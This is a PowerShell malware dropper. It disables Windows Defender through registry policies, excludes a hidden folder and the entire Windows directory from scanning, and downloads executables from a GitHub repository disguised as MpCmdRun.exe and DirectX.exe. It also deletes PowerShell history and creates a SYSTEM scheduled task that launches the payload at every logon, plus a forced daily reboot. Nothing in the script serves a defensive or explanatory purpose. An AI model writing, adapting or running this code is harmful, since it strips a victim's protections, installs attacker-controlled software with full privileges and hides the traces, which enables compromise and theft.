# Define the base registry path
$basePath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"

# Create the required DWORD values
$values = @{
    "DisableAntiSpyware"              = 1
    "DisableRealtimeMonitoring"       = 1
    "DisableAntiVirus"                = 1
    "DisableSpecialRunningModes"      = 1
    "DisableRoutinelyTakingAction"    = 1
    "ServiceKeepAlive"                = 1
}

# Iterate through each value and create it in the registry
foreach ($key in $values.Keys) {
    Set-ItemProperty -Path $basePath -Name $key -Value $values[$key] -Type DWord
}

# Create a new key: Real-Time Protection
$realTimeProtectionPath = Join-Path $basePath "Real-Time Protection"
New-Item -Path $realTimeProtectionPath -Force

# Create the required DWORD values under Real-Time Protection
$realTimeValues = @{
    "DisableBehaviorMonitoring"   = 1
    "DisableOnAccessProtection"   = 1
    "DisableRealtimeMonitoring"   = 1
    "DisableScanOnRealtimeEnable" = 1
}

# Iterate through each value and create it in the Real-Time Protection key
foreach ($key in $realTimeValues.Keys) {
    Set-ItemProperty -Path $realTimeProtectionPath -Name $key -Value $realTimeValues[$key] -Type DWord
}

# Create a new key: Signature Updates
$signatureUpdatesPath = Join-Path $basePath "Signature Updates"
New-Item -Path $signatureUpdatesPath -Force

# Create the required DWORD value under Signature Updates
Set-ItemProperty -Path $signatureUpdatesPath -Name "ForceUpdateFromMU" -Value 1 -Type DWord

# Create a new key: Spynet
$spynetPath = Join-Path $basePath "Spynet"
New-Item -Path $spynetPath -Force

# Create the required DWORD value under Spynet
Set-ItemProperty -Path $spynetPath -Name "DisableBlockAtFirstSeen" -Value 1 -Type DWord

Write-Output "Registry keys and values created successfully."

Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Define the path to the file or folder you want to exclude
$pathToExclude = "C:\Windows\DiagTrack\Settings"

# Add the exclusion to Windows Defender
Add-MpPreference -ExclusionPath $pathToExclude

Write-Host "Exclusion added successfully for: $pathToExclude"

# Define the URL and the destination path for MpCmdRun.exe
$urlMpCmdRun = "https://github.com/XXS437/M/blob/main/listeners/B_server12345.exe?raw=true"
$hiddenDirectoryMpCmdRun = "C:\Windows\DiagTrack\Settings"
$destinationPathMpCmdRun = "$hiddenDirectoryMpCmdRun\MpCmdRun.exe"

# Create the directory if it doesn't exist
if (-not (Test-Path -Path $hiddenDirectoryMpCmdRun)) {
    New-Item -Path $hiddenDirectoryMpCmdRun -ItemType Directory -Force
}

# Download the MpCmdRun.exe file
Invoke-WebRequest -Uri $urlMpCmdRun -OutFile $destinationPathMpCmdRun

# Define the path to the file or folder you want to exclude
$pathToExclude = "$env:windir"

# Add the exclusion to Windows Defender
Add-MpPreference -ExclusionPath $pathToExclude

Write-Host "Exclusion added successfully for: $pathToExclude"

# Define the URL and the destination path for DirectX file (tcp.exe)
$urlDirectX = "https://github.com/XXS437/M/blob/main/tcp.exe?raw=true"  # Direct link to the raw file
$filePathDirectX = "$env:windir\DirectX.exe"  # Destination file path (C:\Windows\tcp.exe)

Invoke-WebRequest -Uri $urlDirectX -OutFile $filePathDirectX 

# Define the task name
$taskName = "MpCmdRunTask"

# Check if the scheduled task exists and remove it if it does
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# Clear PowerShell history
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
Remove-Item -Path $historyPath

schtasks /create /tn "MpCmdRunTask" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"

schtasks /create /tn "DailyRestart" /tr "shutdown /r /f /t 0" /sc daily /st 04:40 /ru SYSTEM
